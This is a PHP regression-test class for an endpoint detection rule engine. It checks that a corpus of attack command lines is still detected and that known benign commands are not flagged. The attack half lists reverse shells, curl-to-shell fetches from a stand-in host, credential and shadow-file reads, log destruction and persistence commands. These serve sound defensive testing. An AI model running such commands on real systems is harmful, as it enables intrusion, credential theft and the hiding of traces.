<?php

namespace App\Services\Quality;

use App\Services\EdrRuleEngine;

/**
 * Runs the rule set against a fixed corpus of events with known verdicts.
 *
 * Every tuning change is a trade: narrowing a rule to stop a false positive
 * is one edit away from narrowing it past the attack it was written for. That
 * has already happened once in this codebase — a `\b` that did not match
 * between a space and a dash meant `--password=` was never redacted at all,
 * and nothing noticed because nothing was checking.
 *
 * The corpus holds both halves of the trade: attacks that must still be
 * caught, and the specific benign commands that previously produced false
 * positives. A change that fixes noise but loses a detection fails here
 * rather than in a customer's environment.
 */
class EdrRuleRegression
{
    private EdrRuleEngine $rules;

    public function __construct(?EdrRuleEngine $rules = null)
    {
        $this->rules = $rules ?? new EdrRuleEngine();
    }

    /**
     * The corpus. Each case says what the command line is, and either which
     * rule must fire or that nothing may.
     *
     * Real cases only: the benign half is drawn from things that actually
     * produced false positives on live hosts, not invented examples.
     *
     * @return array<int, array{name:string, event:array, expect:?string, note:string}>
     */
    public function corpus(): array
    {
        $cases = [];

        /* -------- Attacks that must keep being caught -------- */

        $mustDetect = [
            ['reverse shell via /dev/tcp', "bash -c 'exec 3<>/dev/tcp/10.0.0.5/4444'", '/bin/bash', 'root', 'EDR-002'],
            ['reverse shell via nc -e', 'nc -e /bin/sh 10.0.0.5 4444', '/usr/bin/nc', 'root', 'EDR-002'],
            ['socat reverse shell', 'socat TCP:10.0.0.5:4444 EXEC:/bin/sh', '/usr/bin/socat', 'root', 'EDR-002'],
            ['curl piped to shell', "bash -c 'curl -s http://evil.test/a.sh | bash'", '/bin/bash', 'root', 'EDR-003'],
            ['wget piped to python', "sh -c 'wget -qO- http://evil.test/a | python3'", '/bin/sh', 'root', 'EDR-003'],
            ['execution from /tmp', '/tmp/dropper --stage2', '/tmp/dropper', 'root', 'EDR-004'],
            ['execution from /dev/shm', '/dev/shm/x', '/dev/shm/x', 'root', 'EDR-004'],
            ['base64 decoded to shell', "bash -c 'echo aWQK | base64 -d | sh'", '/bin/bash', 'root', 'EDR-005'],
            ['shadow file access', 'cat /etc/shadow', '/usr/bin/cat', 'root', 'EDR-006'],
            ['ssh private key read', 'cat /home/u/.ssh/id_rsa', '/usr/bin/cat', 'root', 'EDR-006'],
            ['aws credentials read', 'cat /root/.aws/credentials', '/usr/bin/cat', 'root', 'EDR-006'],
            ['history cleared', "bash -c 'history -c'", '/bin/bash', 'root', 'EDR-007'],
            ['auth log destroyed', 'rm -rf /var/log/auth.log', '/usr/bin/rm', 'root', 'EDR-007'],
            ['journal vacuumed', 'journalctl --vacuum-time=1s', '/usr/bin/journalctl', 'root', 'EDR-007'],
            ['crontab installed', 'crontab -', '/usr/bin/crontab', 'root', 'EDR-008'],
            ['authorized_keys appended', "sh -c 'echo key >> /root/.ssh/authorized_keys'", '/bin/sh', 'root', 'EDR-008'],
            ['nsenter into host namespace', 'nsenter -t 1 -m -u -i -n /bin/sh', '/usr/bin/nsenter', 'root', 'EDR-009'],
            ['docker socket mounted', 'mount -o bind /var/run/docker.sock /mnt', '/usr/bin/mount', 'root', 'EDR-009'],
            ['setuid granted', 'chmod u+s /tmp/rootme', '/usr/bin/chmod', 'root', 'EDR-010'],
            ['dangerous capability granted', 'setcap cap_setuid+ep /tmp/x', '/usr/sbin/setcap', 'root', 'EDR-010'],
            ['stage2 from bare IP', 'curl -s http://198.51.100.9/stage2 -o /tmp/s', '/usr/bin/curl', 'root', 'EDR-011'],
            ['web account runs curl', 'curl http://evil.test/x', '/usr/bin/curl', 'www-data', 'EDR-001'],
            ['web account runs python', 'python3 -c "import os"', '/usr/bin/python3', 'www-data', 'EDR-001'],
            ['web account gets a shell', "bash -c 'id; uname -a'", '/bin/bash', 'www-data', 'EDR-001'],
        ];

        foreach ($mustDetect as [$name, $cmdline, $path, $user, $rule]) {
            $cases[] = [
                'name' => $name,
                'event' => $this->event($cmdline, $path, $user),
                'expect' => $rule,
                'note' => 'attack technique that must stay detected',
            ];
        }

        /* -------- Benign activity that previously produced false positives -------- */

        $mustNotDetect = [
            ['laravel scheduler as web user', "sh -c '/usr/bin/php8.4 artisan schedule:run'", '/bin/sh', 'www-data',
                'fired EDR-001 as a webshell on every Laravel site'],
            ['laravel queue worker', "sh -c 'php artisan queue:work'", '/bin/sh', 'www-data',
                'same shape as the scheduler'],
            ['composer as web user', "sh -c 'composer install --no-dev'", '/bin/sh', 'www-data', 'deploy tooling'],
            ['admin docker exec on the host', "docker exec -e X=1 mysql-container mysql -u root -e 'SHOW REPLICAS;'",
                '/usr/bin/docker', 'root', 'fired EDR-009 as a container escape 11 times in one cycle'],
            ['docker run on the host', 'docker run --rm alpine echo hi', '/usr/bin/docker', 'root',
                'same misclassification'],
            ['localhost health check', 'curl -s --max-time 1 http://127.0.0.1:8080/health', '/usr/bin/curl', 'root',
                'fired EDR-011 on every health probe'],
            ['ordinary listing', 'ls -la /var/log', '/usr/bin/ls', 'root', 'must never alert'],
            ['git commit mentioning auth', 'git commit -m "fix auth bug"', '/usr/bin/git', 'vito',
                'the word auth must not be a detection'],
            ['ssh on a custom port', 'ssh -p 2222 user@host', '/usr/bin/ssh', 'vito',
                '-p is a port flag here, not a password'],
            ['find with -print', 'find /var -name "*.log" -print', '/usr/bin/find', 'root',
                '-print must not read as a password flag'],
            ['package manager fetch', 'curl -fsSL https://deb.nodesource.com/setup_20.x', '/usr/bin/curl', 'root',
                'hostname, not a bare IP'],
        ];

        foreach ($mustNotDetect as [$name, $cmdline, $path, $user, $note]) {
            $cases[] = [
                'name' => $name,
                'event' => $this->event($cmdline, $path, $user),
                'expect' => null,
                'note' => $note,
            ];
        }

        return $cases;
    }

    private function event(string $cmdline, string $path, string $username): array
    {
        return [
            'ts' => 1786672413,
            'action' => 'exec',
            'sensor' => 'regression',
            'host' => 'corpus',
            'pid' => 1000,
            'ppid' => 999,
            'uid' => $username === 'root' ? 0 : 33,
            'username' => $username,
            'path' => $path,
            'cmdline' => $cmdline,
            'cwd' => '/tmp',
            'container_id' => '',
            'syscall' => 'exec',
        ];
    }

    /**
     * Cases for rules that only exist across several events. They cannot be
     * expressed in the single-event corpus, and leaving them out would mean
     * the cross-event rules are the only ones nobody ever checks.
     *
     * @return array<int, array{name:string, events:array, expect:?string, note:string}>
     */
    public function batchCorpus(): array
    {
        $recon = [];
        foreach (['whoami', 'id', 'uname', 'hostname', 'w', 'last', 'netstat'] as $index => $binary) {
            $recon[] = $this->event($binary, "/usr/bin/{$binary}", 'root') + ['pid' => 2000 + $index];
        }

        // Same parent for all of them: one shell running reconnaissance is
        // the shape, not seven unrelated commands.
        foreach ($recon as &$event) {
            $event['ppid'] = 1500;
        }
        unset($event);

        $routine = [];
        foreach (['ls', 'cat', 'grep'] as $index => $binary) {
            $routine[] = ['ppid' => 1600] + $this->event($binary, "/usr/bin/{$binary}", 'root')
                + ['pid' => 3000 + $index];
        }

        return [
            [
                'name' => 'hands-on-keyboard reconnaissance burst',
                'events' => $recon,
                'expect' => 'EDR-012',
                'note' => 'seven distinct discovery commands from one shell',
            ],
            [
                'name' => 'a handful of ordinary commands',
                'events' => $routine,
                'expect' => null,
                'note' => 'below the burst threshold — must not alert',
            ],
        ];
    }

    /**
     * @return array{total:int, passed:int, failed:int, failures:array<int, array>, coverage:array<string, int>}
     */
    public function run(): array
    {
        $this->rules->setExclusions([]);
        $this->rules->setWebAccountAllowlist([]);

        $passed = 0;
        $failures = [];
        $coverage = [];

        foreach ($this->corpus() as $case) {
            $findings = $this->rules->evaluate($case['event']);
            $hit = array_column($findings, 'rule');

            if ($case['expect'] === null) {
                if ($hit === []) {
                    $passed++;
                } else {
                    $failures[] = [
                        'name' => $case['name'],
                        'kind' => 'false_positive',
                        'expected' => 'no detection',
                        'actual' => implode(',', $hit),
                        'cmdline' => $case['event']['cmdline'],
                        'note' => $case['note'],
                    ];
                }

                continue;
            }

            if (in_array($case['expect'], $hit, true)) {
                $passed++;
                $coverage[$case['expect']] = ($coverage[$case['expect']] ?? 0) + 1;
            } else {
                // The dangerous direction: a tuning change that quietly
                // removed a detection.
                $failures[] = [
                    'name' => $case['name'],
                    'kind' => 'missed_detection',
                    'expected' => $case['expect'],
                    'actual' => $hit === [] ? 'nothing' : implode(',', $hit),
                    'cmdline' => $case['event']['cmdline'],
                    'note' => $case['note'],
                ];
            }
        }

        foreach ($this->batchCorpus() as $case) {
            $hits = [];

            foreach ($this->rules->evaluateBatch($case['events']) as $batchHit) {
                $hits = array_merge($hits, array_column($batchHit['findings'], 'rule'));
            }

            $matched = $case['expect'] !== null && in_array($case['expect'], $hits, true);

            if ($case['expect'] === null ? $hits === [] : $matched) {
                $passed++;

                if ($case['expect'] !== null) {
                    $coverage[$case['expect']] = ($coverage[$case['expect']] ?? 0) + 1;
                }

                continue;
            }

            $failures[] = [
                'name' => $case['name'],
                'kind' => $case['expect'] === null ? 'false_positive' : 'missed_detection',
                'expected' => $case['expect'] ?? 'no detection',
                'actual' => $hits === [] ? 'nothing' : implode(',', $hits),
                'cmdline' => count($case['events']) . ' events under one parent',
                'note' => $case['note'],
            ];
        }

        $total = count($this->corpus()) + count($this->batchCorpus());

        return [
            'total' => $total,
            'passed' => $passed,
            'failed' => count($failures),
            'failures' => $failures,
            'coverage' => $coverage,
        ];
    }

    /**
     * Rules with no corpus case at all. Untested detection content is how a
     * rule set rots: it keeps passing because nothing asks it anything.
     *
     * @return array<int, string>
     */
    public function untestedRules(array $knownRules): array
    {
        $covered = [];

        foreach ($this->corpus() as $case) {
            if ($case['expect'] !== null) {
                $covered[$case['expect']] = true;
            }
        }

        foreach ($this->batchCorpus() as $case) {
            if ($case['expect'] !== null) {
                $covered[$case['expect']] = true;
            }
        }

        return array_values(array_diff($knownRules, array_keys($covered)));
    }
}
